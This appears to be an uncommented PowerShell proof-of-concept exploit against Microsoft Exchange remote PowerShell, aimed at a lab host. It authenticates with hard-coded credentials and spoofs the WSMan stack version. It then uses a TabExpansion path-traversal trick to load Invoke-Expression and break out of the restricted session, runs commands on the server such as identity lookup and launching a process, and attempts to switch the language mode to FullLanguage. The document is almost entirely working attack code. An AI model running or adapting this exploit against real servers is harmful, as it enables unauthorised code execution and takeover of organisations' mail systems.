$secureString = ConvertTo-SecureString -String "Pwd" -AsPlainText -Force
$UserCredential = New-Object System.Management.Automation.PSCredential -ArgumentList "lab\john", $secureString
$version = New-Object -TypeName System.Version -ArgumentList "2.0"
$mytable = $PSversionTable
$mytable["WSManStackVersion"] = $version
$sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck -ApplicationArguments @{PSversionTable=$mytable}
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://exchange.lab.local/powershell -Credential $UserCredential -Authentication Kerberos -AllowRedirection -SessionOption $sessionOption


Invoke-Command -Session $Session -ScriptBlock { TabExpansion -line ";../../../../Windows/Microsoft.NET/assembly/GAC_MSIL/Microsoft.PowerShell.Commands.Utility/v4.0_3.0.0.0__31bf3856ad364e35/Microsoft.PowerShell.Commands.Utility.dll\Invoke-Expression" -lastWord "-test" }


Invoke-Command $session {Microsoft.PowerShell.Commands.Utility\Invoke-Expression "[System.Security.Principal.WindowsIdentity]::GetCurrent().Name" }

Invoke-Command $session {Microsoft.PowerShell.Commands.Utility\Invoke-Expression "[Diagnostics.Process]::Start('mspaint.exe')" }

Invoke-Command $session {Microsoft.PowerShell.Commands.Utility\Invoke-Expression "(new-object System.Diagnostics.Process)::Start('mspaint.exe')" }

invoke-expression "`$ExecutionContext.SessionState.LanguageMode"

invoke-expression "`$ExecutionContext.SessionState.LanguageMode='FullLanguage'"


$ps = new-object System.Diagnostics.Process
$ps.StartInfo.Filename = "ipconfig.exe"
$ps.StartInfo.Arguments = " /all"
$ps.StartInfo.RedirectStandardOutput = $True
$ps.StartInfo.UseShellExecute = $false
$ps.start()
$ps.WaitForExit()
[string] $Out = $ps.StandardOutput.ReadToEnd();
